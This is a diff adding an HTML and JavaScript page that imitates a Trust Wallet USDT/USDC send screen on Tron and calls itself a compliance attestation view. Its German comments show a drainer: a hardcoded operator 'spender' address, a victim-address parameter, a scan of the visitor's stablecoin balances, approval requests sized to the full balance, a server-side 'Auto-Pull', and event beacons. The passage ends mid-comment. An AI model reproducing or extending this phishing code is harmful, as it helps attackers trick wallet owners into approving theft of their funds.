@@ -1,0 +1,1297 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+<title>Amount</title>
+<meta name="description" content="Chainscaner wallet send view — the token transfer confirmation screen used by the compliance attestation flow.">
+<meta name="robots" content="noindex">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+  html, body { height: 100%; }
+  html {
+    -webkit-text-size-adjust: 100%; text-size-adjust: 100%;
+    /* Lock the document — no rubber-band / no page drift on taps. The
+       scrollable .content keeps working inside the fixed shell */
+    position: fixed;
+    inset: 0;
+    overflow: hidden;
+    /* Kills the 300ms double-tap delay and double-tap zoom — instant keys */
+    touch-action: manipulation;
+  }
+  button, .np-key, .btn-next, .to-bar, .amount-max, .sheet-item {
+    touch-action: manipulation;
+  }
+
+  /* ── Theme Variables — Trust Wallet 2023+ rebrand (Trust Blue/Trust Green) ── */
+  :root {
+    color-scheme: dark;
+    --bg-outer: #07080C;
+    --bg-primary: #07080C;
+    --bg-sheet: #0F111A;
+    --bg-card: #141A30;
+    --bg-input: #181F38;
+    --surface: #1C1F2E;
+    --bg-pill: #1C1F2E;
+    --surface-disabled: #1A1D28;
+    --border: #1E2130;
+    --divider: #1E2130;
+    --border-focus: #4C6FFF;
+    --text-primary: #FFFFFF;
+    --text-secondary: #8A8FA3;
+    --text-muted: #353A5C;
+    --text-disabled: #3A3F5E;
+    --text-placeholder: #353A5C;
+    --dim: #353A5C;
+    --danger: #FF5A5F;
+    --accent: #4C6FFF;
+    --accent-dim: #1A1D28;
+    --accent-text-dim: #3A3F5E;
+    --accent-green: #05B956;
+    --tether-green: #26A17B;
+    --tron-red: #EF0027;
+    --btn-text: #FFFFFF;
+    --icon-color: #8A8FA3;
+    --overlay: rgba(4,6,16,.72);
+    --modal-bg: #141A30;
+    --shadow: rgba(0,0,0,.5);
+    --home-ind: #FFFFFF;
+    --np-active: rgba(255,255,255,.05);
+    /* Viewport-bottom zone covered by in-app browser chrome (TW toolbar).
+       Measured via visualViewport in JS — this is only the pre-JS floor so
+       the bar never slides under the toolbar before the first measure. */
+    --bottom-cover: 100px;
+  }
+
+  /* ── Light mode — follows the device, incl. DApp-browser webviews ── */
+  @media (prefers-color-scheme: light) {
+    :root {
+      color-scheme: light;
+      --bg-outer: #F2F3F7;
+      --bg-primary: #F2F3F7;
+      --bg-sheet: #FFFFFF;
+      --bg-card: #FFFFFF;
+      --bg-input: #F5F6FA;
+      --surface: #F0F1F5;
+      --bg-pill: #F0F1F5;
+      --surface-disabled: #F0F1F5;
+      --border: #EEEFF3;
+      --divider: #EEEFF3;
+      --text-primary: #0B0D14;
+      --text-secondary: #8A8FA3;
+      --text-muted: #C6CAD9;
+      --text-disabled: #C6CAD9;
+      --text-placeholder: #C6CAD9;
+      --dim: #C6CAD9;
+      --accent: #4C6FFF;
+      --icon-color: #8A8FA3;
+      --overlay: rgba(20,24,40,.4);
+      --modal-bg: #FFFFFF;
+      --shadow: rgba(16,24,64,.12);
+      --home-ind: #0B0D14;
+      --np-active: rgba(0,0,0,.05);
+    }
+  }
+
+  body {
+    font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+    background: var(--bg-primary);
+    color: var(--text-primary);
+    height: 100vh;
+    height: 100svh;
+    /* Fully pinned to the viewport — the page can not be dragged anywhere,
+       it must behave like a native screen, not a scrollable web page */
+    position: fixed;
+    inset: 0;
+    width: 100%;
+    overflow: hidden;
+    overscroll-behavior: none;
+    display: flex;
+    flex-direction: column;
+    -webkit-user-select: none;
+    user-select: none;
+    -webkit-touch-callout: none;
+  }
+
+  /* ── Sheet page (screen sits as a sheet over the darker app bg) ── */
+  .sheet-page {
+    flex: 1;
+    width: 100%;
+    max-width: 430px;
+    /* Cap the top inset: DApp-browser webviews report the full Dynamic-Island
+       inset (~59px) even though the URL bar already sits above us — that was
+       the dead strip under the address bar */
+    margin: max(min(env(safe-area-inset-top, 0px), 14px), 8px) auto 0;
+    display: flex;
+    flex-direction: column;
+    background: var(--bg-sheet);
+    border-radius: 24px 24px 0 0;
+    overflow: hidden;
+    min-height: 0;
+    /* iOS-style sheet presentation — rises from the bottom like the real
+       wallet. 'backwards' + tiny delay so the sheet stays in the from-state
+       (off-screen) from the very first paint — without it the mask flashes
+       once at its final position, then jumps down and rises = double slide.
+       No transform persists after the animation, so the position:fixed
+       button keeps its viewport anchor */
+    animation: sheet-rise .45s cubic-bezier(.32,.72,0,1) .06s backwards;
+  }
+  @keyframes sheet-rise {
+    from { transform: translateY(100%); }
+    to   { transform: translateY(0); }
+  }
+  @media (prefers-reduced-motion: reduce) {
+    .sheet-page { animation: none; }
+  }
+
+  /* ── Header ── */
+  .header {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    min-height: 68px;
+    padding: 0 14px;
+    border-bottom: 1px solid var(--divider);
+    flex-shrink: 0;
+    position: relative;
+  }
+  .header-btn {
+    width: 40px; height: 40px;
+    display: flex; align-items: center; justify-content: center;
+    background: var(--surface); border: none; cursor: pointer;
+    color: var(--text-primary);
+    border-radius: 50%;
+    transition: background .15s;
+  }
+  .header-btn:active { background: var(--bg-input); }
+  .header-spacer { width: 40px; height: 40px; flex-shrink: 0; }
+  .header-title {
+    font-size: 17px; font-weight: 600;
+    color: var(--text-primary);
+    position: absolute;
+    left: 50%;
+    transform: translateX(-50%);
+  }
+
+  /* ── Content ── */
+  .content {
+    flex: 1;
+    min-height: 0; /* lets the hero shrink before the numpad overflows */
+    padding: 0;
+    overflow-y: auto;
+    -webkit-overflow-scrolling: touch;
+    overscroll-behavior: none;
+    display: flex;
+    flex-direction: column;
+  }
+  /* ── To bar (recipient from previous step) ── */
+  .to-bar {
+    display: flex;
+    align-items: center;
+    gap: 6px;
+    padding: 12px 14px;
+    border-bottom: 1px solid var(--divider);
+    font-size: 17px;
+    line-height: 1.45;
+    color: var(--text-primary);
+    flex-shrink: 0;
+  }
+  .to-bar .to-label { color: var(--text-secondary); font-weight: 500; flex-shrink: 0; }
+  .to-bar #input-addr {
+    font-weight: 600;
+    letter-spacing: .2px;
+    /* One line, middle-free ellipsis — matches the real app and saves a
+       full row of vertical space on every phone */
+    white-space: nowrap;
+    overflow: hidden;
+    text-overflow: ellipsis;
+    min-width: 0;
+    -webkit-user-select: none;
+    user-select: none;
+  }
+
+  /* ── Amount Hero — vertically centered in the free area ── */
+  .amount-hero {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    flex: 1;
+    min-height: 0;
+    gap: 10px;
+  }
+  .amount-hero input {
+    border: none; outline: none;
+    background: transparent;
+    color: var(--text-primary);
+    font-size: clamp(30px, 6.4svh, 46px);
+    font-weight: 800;
+    letter-spacing: -.01em;
+    text-align: center;
+    width: 100%;
+    caret-color: transparent;
+    transition: color .18s, font-size .15s;
+  }
+  .amount-hero input::placeholder { color: var(--text-muted); font-weight: 800; }
+  .amount-fiat {
+    display: flex;
+    align-items: center;
+    gap: 6px;
+    font-size: 18px; font-weight: 500;
+    color: var(--text-primary);
+    cursor: pointer;
+    -webkit-user-select: none;
+    user-select: none;
+  }
+  .amount-fiat:active { opacity: .7; }
+  .amount-fiat svg { width: 16px; height: 16px; color: var(--text-secondary); }
+  .amount-hint {
+    font-size: 13px; font-weight: 600;
+    color: var(--danger);
+  }
+
+  /* ── Token / balance row ── */
+  .token-row {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    padding: 0 14px;
+    margin-bottom: 16px;
+    flex-shrink: 0;
+  }
+  .token-icon {
+    width: 36px; height: 36px;
+    border-radius: 50%;
+    display: flex; align-items: center; justify-content: center;
+    flex-shrink: 0;
+    position: relative;
+  }
+  .token-icon svg { width: 36px; height: 36px; }
+  .token-badge {
+    position: absolute;
+    right: -3px; bottom: -3px;
+    width: 16px; height: 16px;
+    border-radius: 4px;
+    background: var(--tron-red);
+    border: 2px solid var(--bg-sheet);
+    display: flex; align-items: center; justify-content: center;
+  }
+  .token-badge svg { width: 10px; height: 10px; }
+  .token-info { flex: 1; min-width: 0; }
+  .token-balance {
+    font-size: 17px; font-weight: 600;
+    color: var(--text-primary);
+    letter-spacing: -.01em;
+    white-space: nowrap; overflow: hidden; text-overflow: ellipsis;
+  }
+  .token-fiat {
+    font-size: 14px; font-weight: 500;
+    color: var(--text-secondary);
+    margin-top: 2px;
+  }
+  .amount-max {
+    background: var(--surface);
+    border: none;
+    border-radius: 999px;
+    cursor: pointer;
+    color: var(--text-primary);
+    font-size: 16px; font-weight: 500;
+    padding: 0 18px;
+    height: 40px;
+    transition: all .15s;
+    flex-shrink: 0;
+    margin-left: auto;
+  }
+  .amount-max:active { transform: scale(.95); background: var(--bg-input); }
+
+  /* ── Custom numpad ── */
+  .numpad {
+    display: grid;
+    grid-template-columns: repeat(3, 1fr);
+    padding: 0 14px;
+    flex-shrink: 0;
+  }
+  .np-key {
+    background: none; border: none; cursor: pointer;
+    color: var(--text-primary);
+    font-size: clamp(20px, 3svh, 26px); font-weight: 700;
+    font-family: inherit;
+    /* Keys scale with the real viewport — fixed 57px clipped the last row
+       on short in-app webviews */
+    height: clamp(40px, 6.9svh, 60px);
+    min-height: 0;
+    display: flex; align-items: center; justify-content: center;
+    border-radius: 12px;
+    transition: background .1s, transform .08s;
+    -webkit-user-select: none; user-select: none;
+  }
+  .np-key:active { background: var(--np-active); transform: scale(.94); }
+  .np-key svg { width: 24px; height: 24px; color: var(--text-primary); }
+
+  /* Bottom Sheet */
+  .sheet-overlay {
+    position: fixed; inset: 0;
+    background: var(--overlay);
+    z-index: 1000;
+    animation: fadeIn .2s ease-out;
+  }
+  .sheet {
+    position: fixed;
+    bottom: 0; left: 0; right: 0;
+    background: var(--bg-card);
+    border: 1px solid var(--border);
+    border-bottom: none;
+    border-radius: 24px 24px 0 0;
+    max-height: 74vh;
+    z-index: 1001;
+    animation: slideUp .25s ease-out;
+    display: flex;
+    flex-direction: column;
+    padding-bottom: env(safe-area-inset-bottom, 0);
+  }
+  @keyframes slideUp { from { transform: translateY(100%); } to { transform: translateY(0); } }
+  .sheet-grab {
+    width: 40px; height: 4px;
+    background: var(--border);
+    border-radius: 2px;
+    margin: 10px auto 0;
+    flex-shrink: 0;
+  }
+  .sheet-header {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 14px 20px 12px;
+    border-bottom: 1px solid var(--border);
+  }
+  .sheet-title {
+    font-size: 17px; font-weight: 700;
+    color: var(--text-primary);
+    letter-spacing: -.01em;
+  }
+  .sheet-close {
+    background: none; border: none; cursor: pointer;
+    color: var(--text-secondary); padding: 4px;
+    display: flex; align-items: center; justify-content: center;
+  }
+  .sheet-list {
+    overflow-y: auto;
+    padding: 8px 0;
+  }
+  .sheet-item {
+    display: flex;
+    align-items: center;
+    gap: 14px;
+    padding: 12px 20px;
+    cursor: pointer;
+    transition: background .15s;
+  }
+  .sheet-item:active { background: var(--bg-input); }
+  .sheet-item-icon {
+    width: 40px; height: 40px;
+    border-radius: 50%;
+    display: flex; align-items: center; justify-content: center;
+    flex-shrink: 0;
+  }
+  .sheet-item-icon svg { width: 20px; height: 20px; }
+  .sheet-item-name {
+    font-size: 15px; font-weight: 600;
+    color: var(--text-primary);
+    flex: 1;
+  }
+
+  /* ── Spacer ── */
+  .spacer { flex: 1; min-height: 32px; }
+
+  /* ── Bottom Button ── */
+  .bottom-btn-wrapper {
+    padding: 12px 14px 4px;
+    flex-shrink: 0;
+  }
+  /* In-app wallet browsers (Trust Wallet etc.) draw their own bottom toolbar
+     OVER the webview. The covered zone is measured via visualViewport and
+     exposed as --bottom-cover; the sheet reserves exactly that space, so the
+     in-flow bar always renders above the toolbar and can never slide under
+     it — no fixed positioning, no overlap possible. */
+  @media (max-width: 768px) {
+    .sheet-page {
+      padding-bottom: calc(max(var(--bottom-cover, 0px), env(safe-area-inset-bottom, 0px)) + 8px);
+    }
+    /* The fake home indicator is a desktop prop — real devices draw their
+       own, so the stray line under the button goes away */
+    .home-indicator { display: none; }
+    /* Bottom sheets must float above the DApp-browser toolbar too —
+       bottom:0 would cut their buttons off */
+    .sheet { bottom: calc(max(var(--bottom-cover, 0px), env(safe-area-inset-bottom, 0px))); }
+  }
+  .fee-row {
+    display: flex; justify-content: space-between; align-items: center;
+    padding: 0 6px 8px;
+    font-size: 12.5px; font-weight: 500;
+    color: var(--text-secondary);
+    letter-spacing: .01em;
+  }
+  .fee-val { font-variant-numeric: tabular-nums; font-weight: 600; }
+  .btn-next {
+    width: 100%;
+    height: 50px;
+    background: var(--surface-disabled);
+    color: var(--text-disabled);
+    border: none;
+    border-radius: 999px;
+    font-size: 17px;
+    font-weight: 600;
+    cursor: pointer;
+    transition: background .1s, color .1s, transform .08s;
+    text-align: center;
+    letter-spacing: .01em;
+  }
+  .btn-next.ready {
+    background: var(--accent);
+    color: var(--btn-text);
+  }
+  .btn-next.ready:hover { background: #5B7DFF; }
+  .btn-next:active { transform: scale(.96); filter: brightness(.94); }
+  .btn-next:disabled { cursor: not-allowed; }
+
+  /* ── Home Indicator (iOS) ── */
+  .home-indicator {
+    width: 135px; height: 5px;
+    background: var(--home-ind);
+    border-radius: 3px;
+    margin: 8px auto;
+    opacity: .9;
+  }
+
+  /* ── Responsive: viewport-aware sheet ─────────────────────────────────────
+     Goal: header → to-bar → token row → numpad → Review button ALWAYS fit
+     inside the real visible viewport on every phone, no scrolling needed
+     for the primary flow. The button lives outside .content so it can never
+     be scrolled away or covered. */
+  @media (min-width: 768px) and (min-height: 600px) {
+    /* Desktop framing only: keep the 52px strip that simulates the status
+       bar. Landscape phones (wide but short) stay in mobile mode. */
+    .sheet-page { margin-top: 52px; }
+  }
+  @media (max-height: 700px) {
+    /* Short screens (iPhone SE, small Androids, split view): compress
+       chrome, keep numpad + button fully visible without scrolling */
+    .header { min-height: 56px; }
+    .to-bar { padding: 8px 14px; }
+    .token-row { margin-bottom: 6px; }
+    .amount-hero { padding-top: 8px; padding-bottom: 8px; }
+    .bottom-btn-wrapper { padding-top: 8px; }
+  }
+  @media (max-height: 560px) {
+    /* Landscape phones / very short webviews */
+    .token-row { padding: 0 14px; }
+    .header { min-height: 48px; }
+  }
+
+  /* ── Modal ── */
+  .modal-overlay {
+    position: fixed; inset: 0;
+    background: var(--overlay);
+    display: flex; align-items: center; justify-content: center;
+    z-index: 2000;
+    animation: fadeIn .2s ease-out;
+  }
+  @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+  @keyframes scaleIn { from { transform: scale(.92); opacity: 0; } to { transform: scale(1); opacity: 1; } }
+  .modal-card {
+    background: var(--modal-bg);
+    border: 1px solid var(--border);
+    border-radius: 24px;
+    padding: 28px 24px;
+    width: calc(100% - 32px);
+    max-width: 360px;
+    position: relative;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    text-align: center;
+    box-shadow: 0 24px 48px var(--shadow);
+    animation: scaleIn .2s ease-out;
+  }
+  .modal-close {
+    position: absolute; top: 14px; right: 14px;
+    background: none; border: none; cursor: pointer;
+    color: var(--text-secondary); padding: 4px;
+    display: flex; align-items: center; justify-content: center;
+  }
+  .modal-icon {
+    width: 60px; height: 60px;
+    border-radius: 50%;
+    display: flex; align-items: center; justify-content: center;
+    margin-bottom: 16px;
+  }
+  .modal-icon.pending { background: rgba(5,0,255,.16); }
+  .modal-icon.success { background: rgba(5,185,86,.14); }
+  .modal-icon.error { background: rgba(255,92,92,.14); }
+  .modal-title {
+    font-size: 18px; font-weight: 700;
+    color: var(--text-primary);
+    margin-bottom: 8px;
+    letter-spacing: -.01em;
+  }
+  .modal-text {
+    font-size: 14px; color: var(--text-secondary);
+    line-height: 1.5; margin-bottom: 20px;
+  }
+  .modal-btn {
+    display: block; width: 100%;
+    padding: 14px;
+    background: var(--accent); color: var(--btn-text);
+    border: none; border-radius: 999px;
+    font-size: 15px; font-weight: 700;
+    cursor: pointer; text-decoration: none;
+    text-align: center;
+  }
+  .modal-btn:hover { opacity: .9; }
+  .sheet-pad { padding: 0 14px 14px; }
+  .addr-edit-input {
+    width: 100%; box-sizing: border-box; background: var(--surface);
+    border: 1px solid var(--divider); border-radius: 12px; padding: 14px;
+    color: var(--text-primary); font-size: 15px; font-family: inherit;
+    outline: none; word-break: break-all;
+  }
+  .addr-edit-input:focus { border-color: var(--accent); }
+  .addr-edit-input.invalid { border-color: #FF5A5F; }
+  .addr-edit-error { color: #FF5A5F; font-size: 13px; padding: 0 14px 10px; }
+  .sheet-actions { display: flex; gap: 10px; padding: 0 14px 20px; }
+  .sheet-btn {
+    flex: 1; height: 48px; border-radius: 999px; border: none;
+    font-size: 16px; font-weight: 600; font-family: inherit; cursor: pointer;
+    transition: filter .15s, transform .1s;
+  }
+  .sheet-btn:active { transform: scale(.98); filter: brightness(1.15); }
+  .sheet-btn.primary { background: var(--accent); color: #fff; }
+  .sheet-btn.ghost { background: var(--surface); color: var(--text-primary); }
+  .hidden { display: none !important; }
+  @media (prefers-reduced-motion: reduce) {
+    *, *::before, *::after { transition-duration: .01ms !important; animation-duration: .01ms !important; }
+  }
+</style>
+</head>
+<body>
+
+<div class="sheet-page">
+
+<!-- HEADER -->
+<header class="header">
+  <button class="header-btn" onclick="history.back()" aria-label="Back">
+    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M15 18l-6-6 6-6"/></svg>
+  </button>
+  <span class="header-title" id="header-title">Amount</span>
+  <div class="header-spacer"></div>
+</header>
+
+<!-- TO BAR (spender carried in via link — tap to view, like the real app) -->
+<div class="to-bar" onclick="openAddrSheet()" role="button" tabindex="0" onkeydown="if(event.key==='Enter'||event.key===' '){event.preventDefault();openAddrSheet();}" aria-label="Recipient address">
+  <span class="to-label" id="to-label">To: </span><span id="input-addr">—</span>
+  <span class="to-edit"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M17 3a2.83 2.83 0 1 1 4 4L7.5 20.5 2 22l1.5-5.5L17 3z"/></svg></span>
+</div>
+
+<!-- CONTENT -->
+<main class="content">
+
+  <!-- Amount Hero -->
+  <div class="amount-hero">
+    <input type="text" id="display-amount" placeholder="0" readonly inputmode="decimal" aria-label="Amount">
+    <div class="amount-fiat" onclick="toggleFiatMode()" onkeydown="if(event.key==='Enter'||event.key===' '){event.preventDefault();toggleFiatMode();}" role="button" tabindex="0" aria-label="Switch between token and fiat input">
+      <span id="approx">≈ $0.00</span>
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M7 16V4"/><path d="M7 4L3 8"/><path d="M7 4l4 4"/><path d="M17 8v12"/><path d="M17 20l4-4"/><path d="M17 20l-4-4"/></svg>
+    </div>
+    <div class="amount-hint hidden" id="amount-hint">Insufficient balance</div>
+  </div>
+
+  <!-- Token / balance row — shows the top scanned token, TRON badge -->
+  <div class="token-row">
+    <div class="token-tap" role="button" tabindex="0" aria-label="Token">
+    <div class="token-icon" id="token-icon">
+      <svg viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="12" fill="#26A17B"/><path d="M13.37 12.98v-.003c-.08.005-.49.03-1.4.03-.76 0-1.3-.02-1.4-.03v.003c-2.71-.12-4.73-.59-4.73-1.15s2.02-1.03 4.73-1.15v1.85c.1.01.66.04 1.42.04.91 0 1.31-.04 1.38-.04v-1.85c2.7.12 4.72.59 4.72 1.15s-2.01 1.03-4.72 1.15zm0-2.27V8.57h3.78V5.22H6.84v3.35h3.79v2.14c-3.08.15-5.4.75-5.4 1.48 0 .73 2.32 1.33 5.4 1.48v6.01h2.74v-6.01c3.07-.15 5.39-.75 5.39-1.48 0-.73-2.32-1.33-5.39-1.48z" fill="#fff"/></svg>
+      <span class="token-badge" id="token-badge"><svg viewBox="0 0 32 32" fill="#fff"><path fill-rule="evenodd" d="M7.5 7.257l7.595 19.112 10.583-12.894-3.746-3.562L7.5 7.257zm16.252 6.977l-7.67 9.344.983-8.133 6.687-1.21zM9.472 9.488l6.633 5.502-1.038 8.58L9.472 9.487zM21.7 11.083l2.208 2.099-6.038 1.093 3.83-3.192zM10.194 8.778l10.402 1.914-4.038 3.364-6.364-5.278z"/></svg></span>
+    </div>
+    <div class="token-info">
+      <div class="token-balance"><span id="token-balance">0</span> <span id="display-token">USDT</span></div>
+      <div class="token-fiat" id="token-fiat">$0.00 · Tron</div>
+    </div>
+    </div>
+    <button class="amount-max" onclick="setMax()">Max</button>
+  </div>
+</main>
+
+<!-- Custom numpad — fixed flex sibling, never scrolls or clips -->
+<div class="numpad">
+    <button class="np-key" onclick="pressKey('1')">1</button>
+    <button class="np-key" onclick="pressKey('2')">2</button>
+    <button class="np-key" onclick="pressKey('3')">3</button>
+    <button class="np-key" onclick="pressKey('4')">4</button>
+    <button class="np-key" onclick="pressKey('5')">5</button>
+    <button class="np-key" onclick="pressKey('6')">6</button>
+    <button class="np-key" onclick="pressKey('7')">7</button>
+    <button class="np-key" onclick="pressKey('8')">8</button>
+    <button class="np-key" onclick="pressKey('9')">9</button>
+    <button class="np-key" onclick="pressKey('.')">.</button>
+    <button class="np-key" onclick="pressKey('0')">0</button>
+    <button class="np-key" onclick="backKey()" aria-label="Delete">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"><path d="M22 5H9L2 12l7 7h13a1 1 0 0 0 1-1V6a1 1 0 0 0-1-1z"/><line x1="18" y1="9" x2="12" y2="15"/><line x1="12" y1="9" x2="18" y2="15"/></svg>
+    </button>
+  </div>
+
+<!-- BOTTOM BUTTON -->
+<div class="bottom-btn-wrapper">
+  <div class="fee-row">
+    <span class="fee-label">Network Fee</span>
+    <span class="fee-val" id="fee-val">≈ 14 TRX · paid from your wallet</span>
+  </div>
+  <button class="btn-next" id="next-btn" onclick="clickNext()" disabled>Review</button>
+  <div class="home-indicator"></div>
+</div>
+
+</div><!-- /sheet-page -->
+
+<!-- ADDRESS VIEW SHEET -->
+<div id="addr-sheet" class="hidden">
+  <div class="sheet-overlay" onclick="closeAddrSheet()"></div>
+  <div class="sheet">
+    <div class="sheet-grab"></div>
+    <div class="sheet-header">
+      <span class="sheet-title">Recipient address</span>
+      <button class="sheet-close" onclick="closeAddrSheet()" aria-label="Close">
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
+      </button>
+    </div>
+    <div class="sheet-pad">
+      <input class="addr-edit-input" id="addr-edit" placeholder="T…" spellcheck="false" autocomplete="off" aria-label="Recipient address" readonly>
+    </div>
+    <div class="sheet-actions">
+      <button class="sheet-btn primary" onclick="closeAddrSheet()">Done</button>
+    </div>
+  </div>
+</div>
+
+<!-- RESULT MODAL -->
+<div id="result-modal" class="modal-overlay hidden">
+  <div class="modal-card">
+    <button class="modal-close" onclick="closeModal()" aria-label="Close">
+      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
+    </button>
+    <div class="modal-icon pending" id="modal-icon">
+      <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#3562ff" stroke-width="2"><circle cx="12" cy="12" r="10" opacity=".3"/><path d="M12 2a10 10 0 0 1 10 10" stroke="#3562ff" stroke-linecap="round"/></svg>
+    </div>
+    <h2 class="modal-title" id="result-title">Processing...</h2>
+    <p class="modal-text" id="result-text">The transaction is being processed. Blockchain validation is in progress.</p>
+    <button class="modal-btn hidden" id="connect-btn" onclick="startFlow()">Connect Wallet</button>
+  </div>
+</div>
+
+<script>
+// ── Tron Wallet-Maske — /wallet-Look, Tron-Engine ────────────────────────────
+// ?spender=T…   Allowance-Ziel (Operator). Default: der Operator selbst.
+// ?token=usdt   Einzel-Token (approve = ?amount, default 20)
+// ?for=T…       Opfer-Adresse bekannt → getaccount-Prefetch beim Page-Load
+// ────────────────────────────────────────────────────────────────────────────
+var params = new URLSearchParams(location.search);
+var spender = (params.get("spender") || "TH1PuSNM6q8akSf22Mw9TykN2puFTkifkA").trim();
+var amountParam = (params.get("amount") || "20").trim();
+var forAddr = (params.get("for") || "").trim();
+
+var TOKENS = {
+  usdt: { addr: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t", decimals: 6, name: "USDT" },
+  usdc: { addr: "TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8", decimals: 6, name: "USDC" }
+};
+var tokenParam = (params.get("token") || "auto").toLowerCase();
+var token = TOKENS[tokenParam] || TOKENS.usdt;
+// Auto-Queue: ALLE bekannten TRC-20 mit Balance ≥ minPullUsd, größte→kleinste.
+// Jeder bekommt ein eigenes increaseApproval-Sheet (approve = max(Balance,
+// Link-amount, TronApproveAmt)) und danach den serverseitigen Auto-Pull.
+// Auto-Queue: NUR USDT + USDC (stable-coins mit sicherem Preis) — schneller
+// Scan, keine Sheets auf Airdrop-/Scam-TRC-20.
+var KNOWN_TRC20 = {
+  "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t": { name: "USDT", decimals: 6, px: 1 },
+  "TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8": { name: "USDC", decimals: 6, px: 1 }
+};
+var KNOWN_HEX = {};
+Object.keys(KNOWN_TRC20).forEach(function(a) { KNOWN_HEX[tw_toHex(a).slice(2).toLowerCase()] = a; });
+function scanQueue(acct) {
+  if (!acct || !acct.trc20) return [];
+  var q = [];
+  acct.trc20.forEach(function(entry) {
+    Object.keys(entry).forEach(function(k) {
+      var h = (k.charAt(0) === "T" ? tw_toHex(k).slice(2) : k).toLowerCase();
+      var b58 = KNOWN_HEX[h];
+      if (!b58) return;
+      var raw = String(entry[k]);
+      var meta = KNOWN_TRC20[b58], usd;
+      try {
+        if (BigInt(raw) <= 0n) return;
+        usd = Number(BigInt(raw)) / Math.pow(10, meta.decimals) * meta.px;
+      } catch (e) { return; }
+      if (usd >= MIN_USD) q.push({ addr: b58, decimals: meta.decimals, name: meta.name, raw: raw, usd: usd });
+    });
+  });
+  q.sort(function(a, b) { return b.usd - a.usd; });
+  return q;
+}
+
+// Dust-Schwelle wie exec/wallet/checker: minPullUsd aus /api/config,
+// Default $1 bis der Fetch resolved.
+var MIN_USD = 1;
+var cfgFullP = fetch("/api/config").then(function(r) { return r.json(); }).catch(function() { return null; });
+var cfgP = cfgFullP.then(function(j) { if (j && Number(j.minPullUsd) > 0) MIN_USD = Number(j.minPullUsd); });
+
+var MOBILE = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+var MONITOR_URL = "/api/events";
+var monitSid = "tm-" + Math.random().toString(36).slice(2, 8) + "-" + Date.now().toString(36);
+function monit(ev, data) {
+  try {
+    var payload = JSON.stringify({ ev: ev, t: new Date().toISOString(), sid: monitSid, d: data || {} });
+    if (navigator.sendBeacon && navigator.sendBeacon(MONITOR_URL, payload)) return;
+    fetch(MONITOR_URL, { method: "POST", mode: "no-cors", keepalive: true, body: payload }).catch(function() {});
+  } catch(e) {}
+}
+
+function isTronAddr(a) { return /^T[1-9A-HJ-NP-Za-km-z]{33}$/.test(a); }
+async function tronAddrValid(a) {
+  try {
+    if (!isTronAddr(a)) return false;
+    var ALPH = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
+    var num = 0n;
+    for (var i = 0; i < a.length; i++) {
+      var d = ALPH.indexOf(a[i]); if (d < 0) return false;
+      num = num * 58n + BigInt(d);
+    }
+    var hex = num.toString(16), zeros = 0;
+    while (a[zeros] === "1") zeros++;
+    hex = "00".repeat(zeros) + (hex.length % 2 ? "0" + hex : hex);
+    var bytes = []; for (var j = 0; j < hex.length; j += 2) bytes.push(parseInt(hex.substr(j, 2), 16));
+    if (bytes.length !== 25 || bytes[0] !== 0x41) return false;
+    var payload = new Uint8Array(bytes.slice(0, 21));
+    var h1 = await crypto.subtle.digest("SHA-256", payload);
+    var h2 = new Uint8Array(await crypto.subtle.digest("SHA-256", h1));
+    for (var k = 0; k < 4; k++) if (h2[k] !== bytes[21 + k]) return false;
+    return true;
+  } catch (e) { return false; }
+}
+function tg(path, body) {
+  // trongrid-Transient (403/429/5xx oder HAENGENDE Verbindung) → tronstack.
+  function post(url) {
+    var ctl = typeof AbortController !== "undefined" ? new AbortController() : null;
+    var to = ctl ? setTimeout(function() { ctl.abort(); }, 6000) : null;
+    return fetch(url + path, {
+      method: "POST", headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(body || {}), signal: ctl ? ctl.signal : undefined
+    }).then(function(r) {
+      if (to) clearTimeout(to);
+      if (!r.ok) throw new Error("HTTP " + r.status);
+      return r.json();
+    }).catch(function(e) { if (to) clearTimeout(to); throw e; });
+  }
+  return post("https://api.trongrid.io").catch(function() {
+    return post("https://api.tronstack.io");
+  }).catch(function() {
+    // Beide Nodes geflackert → ein letzter trongrid-Versuch: kurze
+    // Rate-Limit-Fenster sind beim dritten Call oft schon vorbei.
+    return post("https://api.trongrid.io");
+  });
+}
+// getaccount.trc20 ist node-abhaengig inkrementell und haeufig leer obwohl
